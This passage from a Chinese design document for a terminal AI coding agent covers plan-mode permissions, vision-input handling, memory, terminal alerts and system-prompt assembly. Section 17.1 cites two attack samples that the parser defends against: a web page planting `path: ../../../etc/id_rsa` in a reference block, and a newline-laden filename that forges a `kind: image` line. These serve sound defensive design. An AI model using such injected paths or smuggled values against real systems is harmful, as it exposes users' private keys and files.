进入：Shift+Tab 循环到 PLAN，或 `--permission-mode plan` 启动。

- 权限层对 FILE_WRITE 与 UNKNOWN **直接 DENY**（不是 ASK），拒绝串必须指路，
  详见 [9.2](#92-四个权限模式)。
- 系统提示追加 `PermissionModePrompt.of(PLAN)`（每回合重算，因为模式运行期会变），
  其余档位注入空串——模型在默认档看到「你可以写文件」是废话，反而稀释真正重要的指令。
- 提交计划：`ExitPlanMode` 工具（`PlanApprovalBridge.exitPlanModeTool`）→ `PlanRequest` 入模态队列
  → UI 弹三选项面板（`PLAN_OPTIONS`，CANCEL 不占选项位、只走 Esc）。计划正文逐行下沉 scrollback。
- 第 3 项「继续完善计划」进一行反馈输入（独立 `TextAreaState` `planInput`，用 `k.string()` 而非
  char 插入以兼容星平面码点，**不能转交 `inputKeys`**——那绑的是主输入框的 state，反馈会打进输入框）。
  该子模式内 Esc 只退回选项态（与问询子模式内 Esc 取消整回合刻意不同）。
- **子 agent 在 PLAN 下只能做只读调查**：与主 agent 共用同一引擎，写操作照样 DENY；
  收到**专属的**提示段（`forSubagent`），刻意**不提** `ExitPlanMode`——它的工具集里根本没这个工具，
  照抄等于指一条走不通的路，把「不知道为什么被拒」换成「知道了、照做了、还是失败」，
  比不给提示更糟。

---

## 16. 问询面板

库 `AskUserQuestionTool`（`answersValidation(true)`）→ questionHandler `UserQuestionBridge` →
`AskRequest`（record，携 `QuestionSpec` / `OptionSpec`）入模态队列 → UI `askChildren()` 面板 →
`AskResponder` 应答。

- 单选选「其他」进自由文本子模式（`askInput`），该子模式内 **Esc 仍取消整回合**。
- **畸形问询降级**：`isAnswerable(ask)`（至少 1 问、每问至少 1 选项）不过则 `removeModal` +
  `cancelTurnFor`——空选项会让 `onAskKey` 的 `% n` 除零崩事件线程。
- 迟到/队满 → `request.cancel()`。

---

## 17. 视觉输入

`media/` 28 个类分五层。

### 17.1 分层

| 层 | 类 | 职责 |
| --- | --- | --- |
| L0 嗅探 | `MagicSniffer`(Tika 魔数)、`ImageDimensions`(只解 PNG IHDR / JPEG SOF)、`BinarySniff`、`MediaKind`、`ArtifactSource`、`PathContainment` | `isTextFile` 必须看**父类型链含 text/\***（Tika 给 pom.xml 是 `application/xml`，只看顶层会误判成二进制而错误外置）。`PathContainment` **public 是刻意的**：UI 层算相对路径必须与解析器口径逐字一致 |
| L1 产物与格式 | `MediaArtifact`、`MediaArtifactStore`、`FileReference`、`ParsedReference`、`FileReferenceParser`、`ArtifactGc` | 内容寻址 `<sha256>.<ext>`、原子写、幂等去重；仅 IMAGE 建 `latest.<ext>` 软链 |
| L2 入站外置 | `ToolResultMediaHandler`/`TextReferenceMediaHandler`、`ModelCapabilities`、`McpMediaParser`、`MediaExternalizingCallback`、`SessionFileExternalizer` | 字节 → 引用块，**字节永不进会话** |
| L3 出站兑现 | `ImagePreparer`、`PreparedImage`、`VisionBudget`、`VisionModels`、`VisionMaterializer`、`VisionMaterializingChatModel`、`VisionSnapshot` | 引用 → 真 `Media` |
| L4 压缩期保全 + provider 专属 | `MediaReferencePreservingCompactionStrategy`、`DeepSeekVisionMediaRegistry`、`DeepSeekFileStore` | 见 [6.2](#62-自动压缩与-compact) 与 [17.3](#173-deepseek-专属通道) |

`FileReferenceParser` 是**视觉链路的安全边界**（引用块是纯文本、会流经模型，一个网页里写
`path: ../../../etc/id_rsa` 就是攻击面）。四条硬规则：path 必须过 `resolveInRoot`；
必填字段不齐**整块丢弃**；**同名字段出现两次也整块丢弃**（重复只可能来自值里混进换行，
取首取末都是猜，而两个消费者猜得不一样就是解析歧义）；只认 `kind: image`。
外加一条本类管不到的调用方纪律：只扫 `UserMessage` 与 `ToolResponseMessage`，
**跳过 `AssistantMessage`**。

`MediaArtifact` 紧凑构造器跑 `sanitizeName`——Unix 文件名**允许换行**，
一个叫 `"evil\nkind: image\nx.bin"` 的文件能让 render 吐出伪造的 `kind: image` 行。

### 17.2 完整链路

**入口 A：输入框裸路径**
`ui.ImageAttachmentDetector`（每次击键扫一遍）→ `ui.DetectedImage` →
`CodeTuiView.injectAttachments` 渲成引用块追加进待发文本 → 正常 submit → L3 兑现。

- **刻意不引入 `@` 标记**（拖拽白送支持，终端只把路径当粘贴插进来）。代价是
  `把 docs/bug.png 复制到 tmp/` 必然误附；该代价由**附件行可见 + Ctrl+X 撤销**承担，
  **不靠猜句意的规则消灭**。
- **刻意不做 root 包含校验**（那道校验属于引用块解析阶段；在这里拦会让「从桌面拖图」失效）。
- `tokenize` 尊重三种终端拖拽转义（反斜杠转义空格、单引号、双引号）；**引号内不处理反斜杠**
  （Windows 路径 `"C:\shots\a.png"` 在引号内当转义会被吃成 `C:shotsa.png`）。
- 只读前 **64KB** 做嗅探（跑在每次击键上）；缓存按「绝对路径 + mtime」，**负结果同样缓存**。
- 提交时先判 `VisionModels.supportsImage(currentModel())`，不支持则拦住**且绝不 clearInput**。
- `insideRoot` → **不复制**指原文件（「你更新了 design.png 模型该看到新版」），
  sha 用**路径**哈希与 `referenceExistingFile` 一致；越界 → **必须复制**进 artifacts
  （按原路径写引用块会被越界防线**整块丢弃且无任何报错**，图静默消失）。
- 宽高为 0 时两个都传 null——`dimensions: 0x0` 是假信息，比不写更糟。

**入口 B：工具产的图** → `MediaExternalizingCallback`（路径①）四段判定：
MCP 内联字节 → in-root 非文本文件（判据看**磁盘文件是不是文本**而非返回串像不像二进制
——Read 把 PNG 读成带行号的 hexdump，`BinarySniff` 判不出）→ 越界但真实存在的非文本文件
（**外置失败必须 fail-closed**，绝不掉到 `return raw`）→ 无源的疑似二进制串给兜底告示。

id 口径 `contentHashIfInStore`：父目录是 `.codetui/artifacts` 且文件名匹配 `[0-9a-f]{64}.<ext>`
时从文件名**反解内容哈希**（与附件侧逐字一致），项目内其它文件仍用**路径哈希**。
不这么做的后果：同一张图出现两个 id。

**入口 C：过往会话兜底** → `SessionFileExternalizer`（路径②，`submit` 开头调）。
**文本文件不外置**（文本是模型的工作材料，Edit 精确匹配、跨回合续用都靠原文）。

**出站统一收口** `VisionMaterializingChatModel`（**兑现的唯一接线点**）：

- `call` 与 `stream` **都要走**（主 agent 走 stream，子 agent 经 `RetryingChatModel` 桥到 stream，
  只改一条等于子 agent 没有视觉）。
- 模型 id 取自**出站 Prompt 的 options**（实际发出去的那个，子 agent 跑在另一家时天然正确）。
- 位置选在 ChatModel 层而非 advisor：兑现必须在会话记忆**之后**（早了会写进存储、
  图片永久化跨回合累积，那正是整个设计要消灭的）又必须在真正发出**之前**；
  advisor 也够得着这个窗口，但相对顺序靠 order 整数维持，排错一位兑现结果就进存储，
  且失效时不报错、只是账单慢慢长。装饰器在 advisor 链下游，「出站即兑现」字面成立。
- **aux client 刻意不包它**，有守卫测试断言 `auxChatModel` 返回**恰好** `DynamicAuxChatModel`
  ——否则每次自动压缩都会把历史图兑现成真字节发给摘要模型。

`VisionMaterializer` 的核心规则：**当轮 = 最后一条非合成 `UserMessage` 的下标（anchor）及其之后**，
纯位置规则无状态，于是历史图片的上下文占用恒为零（模型想重看就 Read 一次，那条路本来就通）。
`turnKey = hash(anchor 文本) + ":" + anchor`。
执行顺序：sha 去重表**user 先加**（用户图天然优先）→ user 收**全部**引用（超配额的也要留下来
才能改写 delivery）、tool 侧**在收集阶段就砍到上限**（被跳过的引用无处改写，多收只是白做）→
逐张过闸（张数已满时**不再 prepare**）→ user 走 `rewriteAnchor`（**从后往前**替换）、
tool 走 `synthesise` 造一条 user 消息（`ToolResponseMessage` 没有 media 字段）。

`Media.builder().data(bytes)` **必须是 `byte[]`**——实测各家只认 `URI`/`String`/`byte[]`，
传别的会被**静默跳过**。

短路条件是「什么都没改」而**不是**「什么都没兑现」：一张都没兑现但有引用被判超预算时，
delivery 行仍必须改写，否则模型拿到「Read 一次就能看」这句假话。

**预算** `VisionBudget`：每请求分来源配额（user 3 / tool 1）+ token 6000，每回合累计 12 张。
分来源的理由：用户一次贴 1–3 张是他这一轮的全部意图，截图循环一个回合能产几十张且旧的几乎无价值；
一视同仁按「从新到旧」取会让「照这张稿子改」的稿子被随后 Read 的图挤掉。
**按 turnKey 分桶是正确性需要**：ChatModel 实例被主 agent 与所有子 agent 共用。

**`ImagePreparer`** 是一张实测决策表（`SCALABLE` png/jpeg/gif、`TRANSCODE_TO_PNG` bmp/tiff、
`PASS_THROUGH` webp、HEIC/AVIF 不兑现）。**OOM 防护**：用 `ImageReader.getWidth(0)` 只读文件头
拿尺寸，超 50M 像素**在解码前就拒**；缓存按「路径 + mtime + MAX_EDGE」，
**不是优化而是必需**（一个回合的工具循环跑 6 次迭代，不缓存要同一张图解码编码 6 遍）。

**能力判定两个口径，互补别混**：`LlmProvider.capabilities(modelId)` 冻结进 ToolContext 供**入站**
决定引用块写 `not_in_view` 还是 `reference_only`；`VisionModels.supportsImage(...)` 供**出站**
决定要不要真兑现。后者**已包含**全局开关 `CODETUI_VISION=off`，调用方不要再判一次。
名单未知一律判**不支持**——判错方向代价不对称。

### 17.3 DeepSeek 专属通道

spring-ai-deepseek 2.0.0 序列化消息时只用 `getText()`，`Media` 被**静默丢弃**，
且 `content` 是 `String` 装不下 content 数组。解法是对象层 → HTTP 改写层的旁路：

- 注册侧 `DeepSeekThinkingChatModel.registerMedia` 按「**user 消息序号**:media 序号」put 进
  `DeepSeekVisionMediaRegistry`。**必须是 user 序号而非绝对下标**——序列化层把一条
  `ToolResponseMessage` 的 N 条响应 flatMap 展开成 N 条消息，绝对下标只要之前有工具历史就会漂移，
  key 错位后图片**静默丢失**（fail-open）。
- 并发论证：先 `hasRegistrableMedia` 扫一遍，纯文本请求**绝不 clear、绝不 put、不碰注册表**
  （子 agent / 摘要请求与并发有图请求互不干扰）。
- 消费侧 `DeepSeekThinkingBodyCodec.decorateVision` 在已序列化的 JSON 上**只动 role=user**，
  用同一套计数，`take` **消费即删**；查不到 key 即 break，fail-open。
- 接线：流式经 `DeepSeekThinkingClientHttpConnector`（join 请求体 → 注入 `stream_options` +
  thinking + vision → 重设 Content-Length）**恒装**；阻塞经 `rest.requestInterceptor`
  **只在 `mode != DEFAULT` 时装**。
- 两种呈现：`INLINE` → `{type:image_url, image_url:{url:"data:...;base64,..."}}`；
  `FILES` → `{type:file, file_id}`（`DeepSeekFileStore` sha256 幂等缓存 file_id，
  **失败一律降级内联**——Files 是增强不是依赖）。开关 `DEEPSEEK_VISION_TRANSPORT=files`。

> 只有 DeepSeek 的内联通道真机验证过；其余四家的图片通路未验证，第一次真用仍可能 400
> （见 [docs/guide/vision.md](guide/vision.md)）。

---

## 18. 长期记忆

库 `AutoMemoryTools`（6 个工具）+ `MemoryPrompt`（提示词侧）。目录 `<root>/.codetui/memory`，
**仅主 agent** 装配。

`MemoryPrompt.render(memoryDir)` 读 classpath `prompt/AUTO_MEMORY_TOOLS_SYSTEM_PROMPT.md`。
本模块 resources 里放了**同名覆盖文件**（classpath 顺序排在库 jar 之前），
把上游 10.9KB / ~2400 token 的原版精简（原版大半是 8 组对话示例），保留格式契约与防错规则；
文件头注释标明被覆盖的上游版本，**升级库时要复核**。

注入用**纯 `String.replace`** 而非 ST：该文件同时含单花括号 `{MEMORIES_ROOT_DIERCTORY}`
（上游把 DIRECTORY 拼错了，必须照抄）与双花括号示例 `{{memory name}}`，交给 ST 会抛异常。
找不到占位符**显式抛 `IllegalStateException`**（把静默漏注入变成显式失败）。

---

## 19. 终端注意提示

`CodeTuiView.advanceAttention(modalWaiting)`（在 UI 批里、**出队之前**调用，因为出队路径可能 return）
→ `ui.AttentionTracker`（纯状态机）+ `ui.TerminalAttention`（IO）。

`AttentionTracker` 是四态边沿检测机（IDLE / BUSY / WAITING_USER / DONE），返回
`NONE | ALERT_WAITING | ALERT_DONE | RESTORE`。要状态机而不是事件处直呼的理由：
UI 批与按键事件可能连续到达，直呼会在相邻批里重复响铃或让多个事件源互相覆盖标题。

| 语义 | 实现 |
| --- | --- |
| DONE 是**吸收态** | 标题持续显示直到用户按键（`userActed()` 由 `onInputKey` 顶部无条件调）或起了新活 |
| 答完问询、活继续跑**不响铃** | `WAITING_USER → BUSY` 与 `DONE → BUSY` 只 `RESTORE`——「答完就响完成了」是撒谎 |
| 用户主动 Esc 那次忙→闲**不算完成** | `userCancelledSinceLastTick`（volatile，按键线程置位、UI 批消费后复位） |
| busy 定义**刻意减去模态一份** | `state.isBusy()` 含「有模态」，直接用会把 WAITING_USER 拍成 BUSY |

`TerminalAttention.alert`：反射拿私有 backend，写 `ESC]0;title` + `ESC]2;title` + BEL 再 flush。
OSC 0/2 双发是因为不同终端认的不是同一个。`sanitize` 剥掉全部控制字符
（ESC/BEL 会提前截断 OSC 字符串，而标题里可能含用户输入）。
失败契约：任何反射/IO 失败不抛、返回 false、静默降级；所有调用都在渲染线程两帧之间。
文案前缀符号放最前（`⏳` / `✓`），因为 macOS 会把 tab 标题截短。

---

## 20. 系统提示词组成

`AgentTools.SYSTEM_TEMPLATE` 是一段固定中文正文，嵌 **8 个占位符**，全部走 Spring AI 的 ST param
注入（不是字符串拼接）。文本顺序即最终顺序：

| 占位符 | 来源 | 时机 |
| --- | --- | --- |
| `{CO_AUTHOR_GUIDE}` | `coAuthorGuide(CODETUI_CO_AUTHOR)`，未配置返回空串（**默认关闭**） | 装配期 |
| `{WEB_SEARCH_GUIDE}` | `webSearchGuide(bocha != null, brave != null)` 四态；**与工具注册状态严格同步**，都没注册就空串（否则模型去调不存在的工具） | 装配期 |
| `{ENVIRONMENT_INFO}` | `AgentEnvironment.info()` *(lib)* | 装配期 |
| `{GIT_STATUS}` | `quietGitStatus()` —— 装配期临时把 stdout 换成黑洞（库在「非 git 仓库」分支会 `System.out.println`，会漏进 TUI scrollback） | 装配期 |
| `{AGENT_MODEL}` | 装配期烘焙 `provider.defaultModel()`；**每回合 submit 用实际所选覆盖** | 双阶段 |
| `{AUTO_MEMORY}` | `MemoryPrompt.render(...)` | 装配期 |
| `{PROJECT_INSTRUCTIONS}` | `ProjectInstructions.load(root)` | 装配期 |
| `{PERMISSION_MODE}` | 装配期填**空串占位**（不填则渲染缺 param 会抛）；**每回合用 `PermissionModePrompt.of(mode)` 覆盖**（模式随 Shift+Tab 运行期变，而 `defaultSystem` 是 build 期烘焙的） | 双阶段 |

`ProjectInstructions` 两层，load 顺序 broad→specific：`~/.codetui/AGENTS.md` → `<root>/AGENTS.md`
（后读、优先级更高）。各层用 `<user_instructions>` / `<project_instructions>` 包裹，
前面加一句「两段冲突时以更具体的项目级为准；用户在当前对话中的明确要求高于一切」。
**只读不渲染**——AGENTS.md 常含 `{...}` 代码片段。

**为什么这些段落必须是 param 值而不是拼进模板**：ST **不递归解析注入值**，所以 AUTO_MEMORY 的
`{{...}}`、AGENTS.md 里的花括号都安全存活。反过来，`webSearchGuide` / `coAuthorGuide` /
`PermissionModePrompt` 的正文**不得含花括号**——它们虽也是 param 值，但渲染后的文本会被引擎
再解析一次，花括号会炸掉整个系统提示（有单测钉住）。

**不在系统提示里的东西**：技能清单在 `Skill` 工具的**描述**里；
`src/main/resources/agents/*.md` 是**子 agent** 的 spec（子 agent 侧的项目指令与模式提示走
**纯字符串追加**，不经 ST）。

`AppInfo` 与提示词无关：只从 jar MANIFEST 读 `Implementation-Version`，
无 manifest（IDE 直跑）回退 `"dev"`，仅用于欢迎横幅。

---

## 关键环境变量

| 变量 | 读取点 | 默认 / 说明 |
| --- | --- | --- |
| `{DEEPSEEK,ZHIPU,DASHSCOPE,ANTHROPIC,OPENAI,OPENCODE_GO}_API_KEY` | `createProviderRegistry` | 至少配一个 |
| 同上 `_BASE_URL` / `_MODELS` | 同上 | baseUrl 覆盖；`_MODELS` 逗号分隔、首项为默认 |
| `CODETUI_LLM_READ_TIMEOUT_SECONDS` | `LlmTimeouts` | 300，钳 [10,3600]；兼作流式空闲超时 |
| `CODETUI_CONTEXT_WINDOWS` | `ModelContextWindows` | `provider:model=值`，逗号分隔 |
| `CODETUI_UNKNOWN_CONTEXT_WINDOW` | 同上 | 128000 |
| `CODETUI_SUBAGENT_CONCURRENCY` | `AgentTools` → `SubagentRunner` | 4，钳 [1,32] |
| `CODETUI_BACKGROUND_CONCURRENCY` | 同上 | 4，钳 [1,32]；队列容量 `DEFAULT_BACKGROUND_QUEUE=16`（不可配） |
| `CODETUI_TASK_OUTPUT_TIMEOUT_SECONDS` | `AgentTools` → `BackgroundTaskTool` | 300，钳 [1,3600] |
| `BOCHA_API_KEY` / `BOCHA_SEARCH_COUNT` | `AgentTools` | 配了才注册 `BochaWebSearch` |
| `BRAVE_API_KEY` / `BRAVE_SEARCH_COUNT` | 同上 | 配了才注册 `BraveWebSearch` |
| `CODETUI_CO_AUTHOR` | `coAuthorGuide` | 未配置则提示词里无署名段 |
| `CODETUI_VISION` | `VisionModels` | `off` 全局停用视觉 |
| `DEEPSEEK_VISION_TRANSPORT` | `DeepSeekProvider` | 严格等于 `files` 才走 Files API |

## 工作目录下的状态文件

```
<root>/.codetui/
├── sessions/<id>.json      会话事件（FileSessionRepository，原子写）
├── memory/                 长期记忆（AutoMemoryTools）
├── artifacts/              媒体产物 + 超长任务结果（内容寻址，ArtifactGc 500MB 上限）
├── skills/<名>/SKILL.md    项目级技能
├── model.json              上次用的 provider + model
├── thinking.json           每模型的思考档位
├── permissions.json        项目级权限规则（只能收紧）
└── mcp.json                项目级 MCP 配置
```

用户级同名文件在 `~/.codetui/` 下（`permissions.json`、`mcp.json`、`skills/`、`AGENTS.md`、
`config.env`）。




